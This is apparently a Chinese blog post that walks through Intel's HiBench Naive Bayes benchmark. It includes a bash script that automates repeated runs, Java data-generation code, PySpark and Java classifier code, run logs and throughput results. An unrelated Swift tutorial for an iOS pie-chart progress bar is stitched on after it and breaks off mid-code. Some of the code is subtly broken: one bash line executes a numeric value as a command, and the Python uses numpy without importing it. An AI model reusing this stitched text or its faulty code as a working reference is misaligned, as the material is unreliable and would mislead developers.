Mahout bayesian classification(bayes):大规模机器学习，这个负载测试mahout（apache开源机器学习库）中的naive bayesian 训练器，输入的数据是自动生成的文档，文档中的单词符合zipfian分布。 
Mahout k-means clustering(kmeans):测试mahout中的k-means聚类算法，输入的数据集由基于平均分布和高斯分布的genkmeansdataset产生。
data analytics benchmarks 
Hive query benchmarks(hivebench):包含执行的典型olap查询的hive查询（aggregation和join），使用自动生成的web数据，web数据的链接符合zipfian分布。

注：使用的生成数据程序在hadoop-mapreduce-examples-2.6.0 jar 包内，可以使用反编译工具查看。


2.HiBench中bayes算法流程

主要流程为conf下配置测试项，测试语言和DataSize，然后运行bin下run-all.sh完成一次测试，此流程为手动完成，可以编写脚本重复此步骤完成多次测试减少手动操作； 
e.g.

#!/bin/bash

#       Time: 20160930,created by sunfei
#       Describe: automatic run the hibench
#       Functions :
#            search(): Find the style of application in the  99-user_defined_properties.conf,eg:tiny,small..
#                               exec_application_noSQL(): run the application for times,and no use hive
#                               exec_application_SQL(): run the application for times,and use hive
#                               save_result(): save the result of application
#                               main_function(): the main function of running all the appliction
#                               main(): the main function of running different kind application


cpuLoad()
{
        cpu=`grep -c 'model name' /proc/cpuinfo`
        load_15=`uptime | awk '{print $NF}'`
        average_load=`echo "scale=2;a=${load_15}/${cpu};if(length(a)==scale(a)) print 0;print a" | bc`
        date >> datetime-load.txt
        ${average_load} >> cpu-load.txt
        paste datetime-load.txt cpu-load.txt >> load-day.txt
}

search()
{
        #config="/opt/HiBench/HiBench-master/conf/99-user_defined_properties.conf"
        config=/usr/HiBench-master/conf/99-user_defined_properties.conf
        sed -n '/hibench.scale.profile/p' ${config} >> hibench.txt
        var=''
        while read line
        do
                        if [ ${line:0:13} = "hibench.scale" ];then
                                        echo -e "\033[32m match sucessfull! \033[0m"
                                        var=${line:22}
                        fi
        done<"hibench.txt"

        if [ "$var" = "${1}" ];then
                echo -e "\033[31m The style of application can't same,do you want to continue? yes | no \033[0m"
                read -p "Input your chose :" chose
                if [ "${chose}" = "no" ];then
                        exit 1
                else
                        echo -e "\033[32m The ${1}  style of application will be run! \033[0m"
                fi
        fi

        if [ -f "hibench.txt" ];then
                        rm -rf "hibench.txt"
                        echo -e "\033[32m The hibench.txt has deleted! \033[0m"
        fi

        echo -e "\033[32m The application will run the "${1}" style \033[0m"
    sed -i "s/${var}/${1}/" ${config}
}

exec_application_noSQL()
{
        var=0
        for ((i=1;i<=${1};i++))
        do
                        let "var=$i%1"
                        if [ "$var" -eq 0 ];then
                                        hadoop fs -rm  -r hdfs://archive.cloudera.com:8020/user/hdfs/.Trash/*
                                        hadoop fs -rm -r hdfs://archive.cloudera.com:8020/HiBench/*
                        fi
                        echo -e  "\033[32m **********************The current times is ********************:\033[0m" ${i}
                        #/opt/HiBench/HiBench-master/bin/run-all.sh
                        /usr/HiBench-master/bin/run-all.sh
                        echo -e  "\033[32m ********************** The current time is "${i}" ,and it has exec finished successfully! ********************:\033[0m"
        done
        echo -e "\033[32m *********The application has finished,please modify the configuration!***** \033[0m"
}

exec_application_SQL()
{
        var=0
        for ((i=1;i<=${1};i++))
        do
                        echo "drop table uservisits;drop table uservisits_aggre;drop table rankings;drop table rankings_uservisits_join;drop table uservisits_copy;exit;" | /usr/bin/hive
                        let "var=$i%1"
                        if [ "$var" -eq 0 ];then
                                        hadoop fs -rm  -r hdfs://archive.cloudera.com:8020/user/hdfs/.Trash/*
                                        hadoop fs -rm -r hdfs://archive.cloudera.com:8020/HiBench/*
                        fi
                        echo -e  "\033[32m **********************The current times is ********************:\033[0m" ${i}
                        #/opt/HiBench/HiBench-master/bin/run-all.sh
                        /usr/HiBench-master/bin/run-all.sh
                        echo -e  "\033[32m **********************The current time is "${i}" ,and it has exec finished successfully! ********************:\033[0m"
        done
        echo -e "\033[32m *********The application has finished,please modify the configuration!***** \033[0m"

}

save_result()
{
        if [ -f result.txt ];then
                        rm -rf result.txt
                         echo -e "\033[32m The hibench.txt has deleted! \033[0m"
        fi
        #select the words in the report
        #filepath=/opt/HiBench/HiBench-master/report/hibench.report
        filepath=/usr/HiBench-master/report/hibench.report
        word=""
        var1=`date +"%m/%d/%Y-%k:%M:%S"`
        var2=${1}
        var5=".txt"
        var4=${var2}${var5}
        case ${1} in
        "aggregation")
                word="JavaSparkAggregation"
                ;;
        "join")
                word="JavaSparkJoin"
                ;;
        "scan")
                word="JavaSparkScan"
                ;;
        "kmeans")
                word="JavaSparkKmeans"
                ;;
        "pagerank")
                word="JavaSparkPagerank"
                ;;
        "sleep")
                word="JavaSparkSleep"
                ;;
        "sort")
                word="JavaSparkSort"
                ;;
        "wordcount")
                word="JavaSparkWordcount"
                ;;
        "bayes")
                word="JavaSparkBayes"
                ;;
        "terasort")
                word="JavaSparkTerasort"
                ;;
        *)
                echo -e "\033[32m The name of application is wrong,please change it! \033[0m"
                ;;
        esac

        while read line
        do
                        echo $line | sed -n "/${word}/p" >> ${var4}
        done <$filepath
        echo -e "\033[32m The job has finished! \033[0m"
}

main_function()
{
        #Input the name of application need to exec
        for appName in aggregation join scan pagerank sleep sort wordcount bayes terasort kmeans
        do
                #appConfig=/opt/HiBench/HiBench-master/conf/benchmarks.lst
                appConfig=/usr/HiBench-master/conf/benchmarks.lst
                echo "The name of application is :"${appName}
                echo ${appName} > ${appConfig}
                        for style in tiny small large huge gigantic
                        do
                                search ${style}
                                if [ "aggregation" = ${appName} ] || [ "join" = ${appName} ] || [ "scan" = ${appName} ];then
                                                        exec_application_SQL ${1}
                                else
                                                        exec_application_noSQL ${1}
                                fi
                        done
                save_result ${appName}
        done
}

main()
{
        # run the application
        read -p "Input the times of exec: " times
        if [ "${times}" -eq 0 -o "${times}" -gt 60 ];then
                echo -e "\033[31m The times of application can't be empty or gt 60 ! Do you want to continue ? yes | no\033[0m"
                read -p "Input your chose :" chose
                if [ "${chose}" = "no" ];then
                        exit 1
                else
                        echo -e "\033[32m The application will be run ${times} times ! \033[0m"
                fi
        fi
        echo -e "\033[33m Select the style of application : \033[0m \033[31m All | Signal \033[0m"
        read -p "Input your chose :" style
        if [ "${style}" = "" ];then
                echo -e "\033[31m The style of application can't be empty \033[0m"
                exit 1
        elif [ "${style}" != "All" -a "${style}" != "Signal" ];then
                echo -e "\033[31m The style of application is wrong,please correct! \033[0m"
                exit 1
        else
                echo -e "\033[32m The style of application is ok ! \033[0m"
        fi
        if [ "All" = "${style}" ];then
                main_function ${times}
        else
                echo -e "\033[033m Input the name of apliaction,eg:\033[0m \033[31m aggregation | join | scan | kmeans | pagerank | sleep | sort | wordcount | bayes | terasort\033[0m"
                read -p "Input you chose :" application
                if [ "${application}" = "" ];then
                                echo -e "\033[31m The name of application can't be empty! \033[0m"
                                exit 1
                fi
                echo "********************The ${application} will be exec**********************"
                appConfig=/usr/HiBench-master/conf/benchmarks.lst
                #appConfig=/opt/HiBench/HiBench-master/conf/benchmarks.lst
                read -p "Do you want exec all the style of application,eg:tiny,small,large,huge,gigantic? yes | no " chose
                if [ "${chose}" = "" ];then
                        echo -e "\033[31m The style of application can't be empty! \033[0m"
                        exit 1
                elif [ "yes" != ${chose} ] && [ "no" != ${chose} ];then
                        echo -e "\033[31m The style of application is wrong,please correct! \033[0m"
                        exit 1
                else
                        echo -e "\033[32m The style of application is ok ! \033[0m"
                fi
                read -p "Input the sytle of application,eg:( tiny small large huge gigantic )!" appStyle
                echo "***************************The ${appStyle} style will be exec***************************"
                for appName in ${application}
                do
                        echo ${appName} > ${appConfig}
                        if [ "yes" = "${chose}" ];then
                                for var in tiny small large huge gigantic
                                do
                                        echo "******************The ${appName} will be exec!************************************"
                                        search ${var}
                                        if [ "aggregation" = ${appName} ] || [ "join" = ${appName} ] || [ "scan" = ${appName} ];then
                                                        exec_application_SQL ${times}
                                        else
                                                        exec_application_noSQL ${times}
                                        fi
                                done
                        else
                        #       read -p "Input the sytle of application,eg:( tiny small large huge gigantic )!" appStyle
                                echo "**************************The ${appName} will be exec!************************"
                                if [ "${appStyle}" = "" ];then
                                                echo -e "\033[31m The style of application can't be empty! \033[0m"
                                                exit 1
                                fi
                                for var in ${appStyle}
                                do
                                        search ${var}
                                        if [ "aggregation" = ${appName} ] || [ "join" = ${appName} ] || [ "scan" = ${appName} ];then
                                                exec_application_SQL ${times}
                                        else
                                                exec_application_noSQL ${times}
                                        fi
                                done
                        fi
                        save_result ${appName}
                done
        fi
}

# the main function of application
main

prepare.sh->run.sh为run-all.sh的子流程；
enter_bench->…->leave_bench为prepare.sh和run.sh的子流程；
enter_bench…..gen_report等为workload-functions.sh中的公共函数。

流程图如下：

2.1 数据生成代码分析，接口：HiBench.DataGen
对java代码我不太熟悉，接口中我看主要用了一个switch语句
DataGen类中DataOptions options = new DataOptions(args); 
如果是bayes测试的话，就调用对应的数据生成类，进行数据生成。生成的数据接口部分代码：
case BAYES: {
                BayesData data = new BayesData(options);
                data.generate();
                break;
            }
BayesData实现：
package HiBench;

import java.io.IOException;
import java.net.URISyntaxException;
import java.util.Random;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.apache.hadoop.fs.Path;
import org.apache.hadoop.io.LongWritable;
import org.apache.hadoop.io.Text;
import org.apache.hadoop.mapred.FileInputFormat;
import org.apache.hadoop.mapred.FileOutputFormat;
import org.apache.hadoop.mapred.JobClient;
import org.apache.hadoop.mapred.JobConf;
import org.apache.hadoop.mapred.MapReduceBase;
import org.apache.hadoop.mapred.Mapper;
import org.apache.hadoop.mapred.OutputCollector;
import org.apache.hadoop.mapred.Reporter;
import org.apache.hadoop.mapred.SequenceFileOutputFormat;
import org.apache.hadoop.mapred.lib.NLineInputFormat;

public class BayesData {

    private static final Log log = LogFactory.getLog(BayesData.class.getName());

    private DataOptions options;
    private Dummy dummy;
    private int cgroups;

    BayesData(DataOptions options) {
        this.options = options;
        parseArgs(options.getRemainArgs());
    }

    private void parseArgs(String[] args) {

        for (int i=0; i<args.length; i++) {
            if ("-class".equals(args[i])) {
                cgroups = Integer.parseInt(args[++i]);
            } else {
                DataOptions.printUsage("Unknown bayes data arguments -- " + args[i] + "!!!");
                System.exit(-1);
            }
        }
    }

    private static class CreateBayesPages extends MapReduceBase implements
    Mapper<LongWritable, Text, Text, Text> {

        private static final Log log = LogFactory.getLog(CreateBayesPages.class.getName());

        private long pages, slotpages;
        private int groups;
        private HtmlCore generator;
        private Random rand;

        public void configure(JobConf job) {
            try {
                pages = job.getLong("pages", 0);
                slotpages = job.getLong("slotpages", 0);
                groups = job.getInt("groups", 0);

                generator = new HtmlCore(job);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        @Override
        public void map(LongWritable key, Text value,
                OutputCollector<Text, Text> output, Reporter reporter)
                throws IOException {

            int slotId = Integer.parseInt(value.toString().trim());
            long[] range = HtmlCore.getPageRange(slotId, pages, slotpages);
            generator.fireRandom(slotId);
            rand = new Random(slotId * 1000 + 101);

            Text k = new Text();
            for (long i=range[0]; i<range[1]; i++) {
                String classname = "/class" + rand.nextInt(groups);
                k.set(classname);
                value.set(generator.genBayesWords());
                output.collect(k, value);
                reporter.incrCounter(HiBench.Counters.BYTES_DATA_GENERATED,
                    k.getLength()+value.getLength());
                if (0==(i % 10000)) {
                    log.info("still running: " + (i - range[0]) + " of " + slotpages);
                }
            }
        }
    }

    private void setBayesOptions(JobConf job) throws URISyntaxException {
        job.setLong("pages", options.getNumPages());
        job.setLong("slotpages", options.getNumSlotPages());
        job.setInt("groups", cgroups);

        Utils.shareWordZipfCore(options, job);
    }

    private void createBayesData() throws IOException, URISyntaxException {

        log.info("creating bayes text data ... ");

        JobConf job = new JobConf();

        Path fout = options.getResultPath();
        Utils.checkHdfsPath(fout);

        String jobname = "Create bayes data";
        job.setJobName(jobname);

        Utils.shareDict(options, job);

        setBayesOptions(job);

        FileInputFormat.setInputPaths(job, dummy.getPath());
        job.setInputFormat(NLineInputFormat.class);

        job.setJarByClass(CreateBayesPages.class);
        job.setMapperClass(CreateBayesPages.class);
        job.setNumReduceTasks(0);

        FileOutputFormat.setOutputPath(job, fout);
        job.setOutputFormat(SequenceFileOutputFormat.class);
        job.setMapOutputKeyClass(Text.class);
        job.setMapOutputValueClass(Text.class);
        job.setOutputKeyClass(Text.class);
        job.setOutputValueClass(Text.class);

        log.info("Running Job: " +jobname);
        log.info("Pages file " + dummy.getPath() + " as input");
        log.info("Rankings file " + fout + " as output");
        JobClient.runJob(job);
        log.info("Finished Running Job: " + jobname);
    }

    private void init() throws IOException {

        Utils.checkHdfsPath(options.getResultPath(), true);
        Utils.checkHdfsPath(options.getWorkPath(), true);

        dummy = new Dummy(options.getWorkPath(), options.getNumMaps());

        int words = RawData.putDictToHdfs(new Path(options.getWorkPath(), HtmlCore.getDictName()), options.getNumWords());
        options.setNumWords(words);

        Utils.serialWordZipf(options);
    }

    public void generate() throws Exception {

        init();

        createBayesData();

        close();
    }

    private void close() throws IOException {
        log.info("Closing bayes data generator...");
        Utils.checkHdfsPath(options.getWorkPath());
    }
}

prepare.sh运行时输出如下，可以看到刚开始主要是读取配置文件中的内容，随后调用hadoop和jar包跑了一个任务，这个就是bayes文本分类的生成数据，按照第一节以及介绍的和官网的说明，这个文本主要使用linux中的字典：”/usr/share/dict/words”并且符合zipfian分布。
[hdfs@sf11 prepare]$ ./prepare.sh  
patching args= 
Parsing conf: /opt/HiBench/HiBench-master/conf/00-default-properties.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/01-default-streamingbench.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/10-data-scale-profile.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/20-samza-common.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/30-samza-workloads.conf 
Parsing conf: /opt/HiBench/HiBench-master/conf/99-user_defined_properties.conf 
Parsing conf: /opt/HiBench/HiBench-master/workloads/bayes/conf/00-bayes-default.conf 
Parsing conf: /opt/HiBench/HiBench-master/workloads/bayes/conf/10-bayes-userdefine.conf 
probe sleep jar: /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/share/hadoop/mapreduce2/hadoop-mapreduce-client-jobclient-tests.jar 
start HadoopPrepareBayes bench 
/opt/HiBench/HiBench-master/bin/functions/workload-functions.sh: line 120: /dev/stderr: Permission denied 
rm: `hdfs://archive.cloudera.com:8020/HiBench/Bayes/Input’: No such file or directory 
Submit MapReduce Job: /opt/cloudera/parcels/CDH/lib/hadoop/bin/hadoop –config /etc/hadoop/conf jar /opt/HiBench/HiBench-master/src/autogen/target/autogen-5.0-SNAPSHOT-jar-with-dependencies.jar HiBench.DataGen -t bayes -b hdfs://archive.cloudera.com:8020/HiBench/Bayes -n Input -m 300 -r 1600 -p 500000 -class 100 -o sequence 
16/10/21 16:34:02 WARN mapreduce.JobResourceUploader: Hadoop command-line option parsing not performed. Implement the Tool interface and execute your application with ToolRunner to remedy this. 
16/10/21 16:34:32 INFO HiBench.BayesData: Closing bayes data generator… 
finish HadoopPrepareBayes bench
部分生成数据：

在看了将近两周的HiBench代码进行测试后，终于摸清上述的运行流程，intel 的这个测试框架确实比较简介，通过配置文件和shell以及一些大数据框架自带的例子（如Hibench中的workcount测试就是直接调用hadoop或者spark自带的程序）完成了整个庞大的测试工作，下面我们针对贝叶斯文本分类算法中HiBench使用的三种语言：python，scala，java分别进行分析：
2.3 python代码分析
 

部分python代码：
#
# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements.  See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the "License"); you may not use this file except in compliance with
# the License.  You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

"""
A naive bayes program using MLlib.

This example requires NumPy (http://www.numpy.org/).
"""

import sys

from pyspark import SparkContext
from pyspark.mllib.util import MLUtils
from pyspark.mllib.classification import NaiveBayes
from pyspark.mllib.regression import LabeledPoint
from pyspark.mllib.linalg import Vectors
from pyspark.storagelevel import StorageLevel
from operator import add
from itertools import groupby
#
# Adopted from spark's doc: http://spark.apache.org/docs/latest/mllib-naive-bayes.html
#
def parseVector(line):
    return np.array([float(x) for x in line.split(' ')])

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print >> sys.stderr, "Usage: bayes <file>"
        exit(-1)
    sc = SparkContext(appName="PythonNaiveBayes")
    filename = sys.argv[1]


    data = sc.sequenceFile(filename, "org.apache.hadoop.io.Text", "org.apache.hadoop.io.Text")
    wordCount = data                                \
        .flatMap(lambda (key, doc):doc.split(" "))    \
        .map(lambda x:(x, 1))                                \
        .reduceByKey(add)

    wordSum = wordCount.map(lambda x:x[1]).reduce(lambda x,y:x+y)
    wordDict = wordCount.zipWithIndex()             \
        .map(lambda ((key, count), index): (key, (index, count*1.0 / wordSum)) )             \
        .collectAsMap()
    sharedWordDict = sc.broadcast(wordDict)

    # for each document, generate vector based on word freq
    def doc2vector(dockey, doc):
        # map to word index: freq
        # combine freq with same word
        docVector = [(key, sum((z[1] for z in values))) for key, values in
                     groupby(sorted([sharedWordDict.value[x] for x in doc.split(" ")],
                                    key=lambda x:x[0]),
                             key=lambda x:x[0])]

        (indices, values) = zip(*docVector)      # unzip
        label = float(dockey[6:])
        return label, indices, values

    vector = data.map( lambda (dockey, doc) : doc2vector(dockey, doc))

    vector.persist(StorageLevel.MEMORY_ONLY)
    d = vector.map( lambda (label, indices, values) : indices[-1] if indices else 0)\
              .reduce(lambda a,b:max(a,b)) + 1


#    print "###### Load svm file", filename
    #examples = MLUtils.loadLibSVMFile(sc, filename, numFeatures = numFeatures)
    examples = vector.map( lambda (label, indices, values) : LabeledPoint(label, Vectors.sparse(d, indices, values)))

    examples.cache()

    # FIXME: need randomSplit!
    training = examples.sample(False, 0.8, 2)
    test = examples.sample(False, 0.2, 2)

    numTraining = training.count()
    numTest = test.count()
    print " numTraining = %d, numTest = %d." % (numTraining, numTest)
    model = NaiveBayes.train(training, 1.0)

    model_share = sc.broadcast(model)
    predictionAndLabel = test.map( lambda x: (x.label, model_share.value.predict(x.features)))
#    prediction = model.predict(test.map( lambda x: x.features ))
#    predictionAndLabel = prediction.zip(test.map( lambda x:x.label ))
    accuracy = predictionAndLabel.filter(lambda x: x[0] == x[1]).count() * 1.0 / numTest

    print "Test accuracy = %s." % accuracy


2.4 scala 代码分析
run-spark-job org.apache.spark.examples.mllib.SparseNaiveBayes ${INPUT_HDFS}
显然scala 的朴素贝叶斯就是调用spark mllib库中的代码了
 
 

2.5 java 代码分析
run-spark-job com.intel.sparkbench.bayes.JavaBayes ${INPUT_HDFS}
java部分比较意外的HiBench没有采用原生的代码或者jar包，而是自己写了一个 
代码如下，回头慢慢分析：
/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.intel.sparkbench.bayes;

import org.apache.spark.SparkContext;
import org.apache.spark.api.java.function.FlatMapFunction;
import org.apache.spark.api.java.function.Function;
import org.apache.spark.api.java.function.Function2;
import org.apache.spark.api.java.function.PairFunction;
import org.apache.spark.broadcast.Broadcast;
import org.apache.spark.mllib.classification.NaiveBayesModel;
import org.apache.spark.mllib.linalg.Vectors;
import org.apache.spark.rdd.RDD;
import org.apache.spark.storage.StorageLevel;
import scala.*;
import org.apache.spark.SparkConf;
import org.apache.spark.api.java.JavaPairRDD;
import org.apache.spark.api.java.JavaRDD;
import org.apache.spark.api.java.JavaSparkContext;
import org.apache.spark.mllib.regression.LabeledPoint;
import org.apache.spark.mllib.util.MLUtils;
import org.apache.spark.mllib.classification.NaiveBayes;
import org.apache.hadoop.io.Text;

import java.lang.Boolean;
import java.lang.Double;
import java.lang.Long;
import java.util.*;
import java.util.regex.Pattern;


/*
 * Adopted from spark's doc: http://spark.apache.org/docs/latest/mllib-naive-bayes.html
 */
public final class JavaBayes {
  private static final Pattern SPACE = Pattern.compile(" ");

  public static void main(String[] args) throws Exception {

    if (args.length < 1) {
      System.err.println("Usage: JavaBayes <file>");
      System.exit(1);
    }

    Random rand = new Random();

    SparkConf sparkConf = new SparkConf().setAppName("JavaBayes");
    JavaSparkContext ctx = new JavaSparkContext(sparkConf);
//    int numFeatures = Integer.parseInt(args[1]);

    // Generate vectors according to input documents
    JavaPairRDD<String, String> data = ctx.sequenceFile(args[0], Text.class, Text.class)
            .mapToPair(new PairFunction<Tuple2<Text, Text>, String, String>() {
                @Override
                public Tuple2<String, String> call(Tuple2<Text, Text> e) {
                    return new Tuple2<String, String>(e._1().toString(), e._2().toString());
                }
            });

    JavaPairRDD<String, Long> wordCount = data
            .flatMap(new FlatMapFunction<Tuple2<String, String>, String>() {
                @Override
                public Iterable<String> call(Tuple2<String, String> e) {
                    return Arrays.asList(SPACE.split(e._2()));
                }
            })
            .mapToPair(new PairFunction<String, String, Long>() {
                @Override
                public Tuple2<String, Long> call(String e) {
                    return new Tuple2<String, Long>(e, 1L);
                }
            })
            .reduceByKey(new Function2<Long, Long, Long>() {
                @Override
                public Long call(Long i1, Long i2) {
                    return i1 + i2;
                }
            });

      final Long wordSum = wordCount.map(new Function<Tuple2<String, Long>, Long>(){
          @Override
          public Long call(Tuple2<String, Long> e) {
              return e._2();
          }
      })
      .reduce(new Function2<Long, Long, Long>() {
          @Override
          public Long call(Long v1, Long v2) throws Exception {
              return v1 + v2;
          }
      });

    List<Tuple2<String, Tuple2<Long, Double>>> wordDictList = wordCount.zipWithIndex()
            .map(new Function<Tuple2<Tuple2<String, Long>, Long>, Tuple2<String, Tuple2<Long, Double>>>() {
                @Override
                public Tuple2<String, Tuple2<Long, Double>> call(Tuple2<Tuple2<String, Long>, Long> e) throws Exception {
                    String key = e._1()._1();
                    Long count = e._1()._2();
                    Long index = e._2();
                    return new Tuple2<String, Tuple2<Long, Double>>(key, new Tuple2<Long, Double>(index,
                            count.doubleValue() / wordSum));
                }
            }).collect();

    Map<String, Tuple2<Long, Double>> wordDict = new HashMap();
    for (Tuple2<String, Tuple2<Long, Double>> item : wordDictList) {
        wordDict.put(item._1(), item._2());
    }

    final Broadcast<Map<String, Tuple2<Long, Double>>> sharedWordDict = ctx.broadcast(wordDict);

    // for each document, generate vector based on word freq
      JavaRDD<Tuple3<Double, Long[], Double[]>> vector = data.map(new Function<Tuple2<String, String>, Tuple3<Double, Long[], Double[]>>() {
          @Override
          public Tuple3<Double, Long[], Double[]> call(Tuple2<String, String> v1) throws Exception {
              String dockey = v1._1();
              String doc = v1._2();
              String[] keys = SPACE.split(doc);
              Tuple2<Long, Double>[] datas = new Tuple2[keys.length];
              for (int i = 0; i < keys.length; i++) {
                  datas[i] = sharedWordDict.getValue().get(keys[i]);
              }
              Map<Long, Double> vector = new HashMap<Long, Double>();
              for (int i = 0; i < datas.length; i++) {
                  Long indic = datas[i]._1();
                  Double value = datas[i]._2();
                  if (vector.containsKey(indic)) {
                      vector.put(indic, value + vector.get(indic));
                  } else {
                      vector.put(indic, value);
                  }
              }

              Long[] indices = new Long[vector.size()];
              Double[] values = new Double[vector.size()];

              SortedSet<Long> sortedKeys = new TreeSet<Long>(vector.keySet());
              int c = 0;
              for (Long key : sortedKeys) {
                  indices[c] = key;
                  values[c] = vector.get(key);
                  c+=1;
              }

              Double label = Double.parseDouble(dockey.substring(6));
              return new Tuple3<Double, Long[], Double[]>(label, indices, values);
          }
      });

      vector.persist(StorageLevel.MEMORY_ONLY());
       final Long d = vector
               .map(new Function<Tuple3<Double,Long[],Double[]>, Long>() {
                   @Override
                   public Long call(Tuple3<Double, Long[], Double[]> v1) throws Exception {
                       Long[] indices = v1._2();
                       if (indices.length > 0) {
//                           System.out.println("v_length:"+indices.length+"  v_val:" + indices[indices.length - 1]);
                           return indices[indices.length - 1];
                       } else return Long.valueOf(0);
                   }
               })
              .reduce(new Function2<Long, Long, Long>() {
                  @Override
                  public Long call(Long v1, Long v2) throws Exception {
//                      System.out.println("v1:"+v1+"  v2:"+v2);
                      return v1 > v2 ? v1 : v2;
                  }
              }) + 1;

    RDD<LabeledPoint> examples = vector.map(new Function<Tuple3<Double,Long[],Double[]>, LabeledPoint>() {
        @Override
        public LabeledPoint call(Tuple3<Double, Long[], Double[]> v1) throws Exception {
            int intIndices [] = new int[v1._2().length];
            double intValues [] = new double[v1._3().length];
            for (int i=0; i< v1._2().length; i++){
                intIndices[i] = v1._2()[i].intValue();
                intValues[i] = v1._3()[i];
            }
            return new LabeledPoint(v1._1(), Vectors.sparse(d.intValue(),
                    intIndices, intValues));
        }
    }).rdd();

    //RDD<LabeledPoint> examples = MLUtils.loadLibSVMFile(ctx.sc(), args[0], false, numFeatures);
    RDD<LabeledPoint>[] split = examples.randomSplit(new double[]{0.8, 0.2}, rand.nextLong());

    JavaRDD<LabeledPoint> training = split[0].toJavaRDD();
    JavaRDD<LabeledPoint> test = split[1].toJavaRDD();

    final NaiveBayesModel model = NaiveBayes.train(training.rdd(), 1.0);
    JavaRDD<Double> prediction =
        test.map(new Function<LabeledPoint, Double>() {
            @Override
            public Double call(LabeledPoint p) {
                return model.predict(p.features());
            }
        });

    JavaPairRDD < Double, Double > predictionAndLabel =
        prediction.zip(test.map(new Function<LabeledPoint, Double>() {
            @Override
            public Double call(LabeledPoint p) {
                return p.label();
            }
        }));

    double accuracy = (double) predictionAndLabel.filter(
            new Function<Tuple2<Double, Double>, Boolean>() {
                @Override
                public Boolean call(Tuple2<Double, Double> pl) {
                    return pl._1().equals(pl._2());
                }
            }).count() / test.count();

    System.out.println(String.format("Test accuracy = %f", accuracy));
    ctx.stop();
  }
}



3.运行结果



Type
Date
Time
Input_data_size
Duration(s)
Throughput(bytes/s)
Throughput/node



JavaSparkBayes
2016-10-09
16:41:09
113387030
48.857
2320793
2320793


ScalaSparkBayes
2016-10-09
16:42:00
113387030
45.164
2510562
2510562


PythonSparkBayes
2016-10-09
16:44:03
113387030
118.521
956683
956683


bayes算法数据规模参考：
#Bayes 
hibench.bayes.tiny.pages                        25000 
hibench.bayes.tiny.classes                      10 
hibench.bayes.tiny.ngrams                       1 
hibench.bayes.small.pages                       30000 
hibench.bayes.small.classes                     100 
hibench.bayes.small.ngrams                      2 
hibench.bayes.large.pages                       100000 
hibench.bayes.large.classes                     100 
hibench.bayes.large.ngrams                      2 
hibench.bayes.huge.pages                        500000 
hibench.bayes.huge.classes                      100 
hibench.bayes.huge.ngrams                       2 
hibench.bayes.gigantic.pages                    1000000 
hibench.bayes.gigantic.classes                  100 
hibench.bayes.gigantic.ngrams                   2 
hibench.bayes.bigdata.pages                     20000000 
hibench.bayes.bigdata.classes                   20000 
hibench.bayes.bigdata.ngrams                    2

参考文献

https://github.com/intel-hadoop/HiBench
 








ios swift 实现饼状图进度条


//
//  ProgressControl.swift
//  L02MyProgressControl
//
//  Created by plter on 7/29/14.
//  Copyright (c) 2014 jikexueyuan. All rights reserved.
//

import UIKit

class ProgressControl: UIView {

    override init(frame: CGRect) {
        super.init(frame: frame)
        // Initialization code
        
        self.backgroundColor = UIColor(white: 1, alpha: 0)
    }

    required init(coder aDecoder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }

    
    private var _progressValue:CGFloat = 0

    public func getProgressValue()->CGFloat{
        return _progressValue
    }
    
    public func setProgressValue(value:CGFloat){
        _progressValue = value
        
        setNeedsDisplay()
    }
    
    // Only override drawRect: if you perform custom drawing.
    // An empty implementation adversely affects performance during animation.
    override func drawRect(rect: CGRect)
    {
        // Drawing code
        
        var ctx = UIGraphicsGetCurrentContext()
        
        var r = rect.width/2
        
        CGContextAddArc(ctx, r, r, r, 0, 3.141592653*2, 0)
        CGContextSetRGBFillColor(ctx, 0.7, 0.7, 0.7, 1)
        CGContextFillPath(ctx)
        
        
        CGContextAddArc(ctx, r, r, r, 0, 3.141592653*2*_progressValue, 0)
        CGContextAddLineToPoint(ctx, r, r)
        CGContextSetRGBFillColor(ctx, 0, 0, 1, 1)
        CGContextFillPath(ctx)
    }

}


viewcontroller：

//
//  ViewController.swift
//  L02MyProgressControl
//
//  Created by plter on 7/29/14.
//  Copyright (c) 2014 jikexueyuan. All rights reserved.
//

import UIKit

class ViewController: UIViewController {
                            
    @IBAction func addProgressBtnPressed(sender: AnyObject) {
        
        pc.setProgressValue(pc.getProgressValue()+0.1)
    }
    
    
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view, typically from a nib.
        
        pc = ProgressControl(frame: CGRect(x: 100, y: 100, width: 100, height: 100))
        self.view.addSubview(pc)
    }
    
    
    private var pc:ProgressControl!
    

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
        // Dispose of any resources that can be recreated.
    }


}



使用alertview展示的方案：


            let frame = CGRectMake(0, 0, 78, 78)
            let window = UIWindow()
            window.backgroundColor = UIColor.clearColor()
            let mainView = UIView()
            mainView.layer.cornerRadius = 12
            mainView.backgroundColor = UIColor(red:0, green:0, blue:0, alpha: 0.8)
            
            let ai = UIActivityIndicatorView(activityIndicatorStyle: UIActivityIndicatorViewStyle.WhiteLarge)
            ai.frame = CGRectMake(21, 21, 36, 36)
            ai.startAnimating()
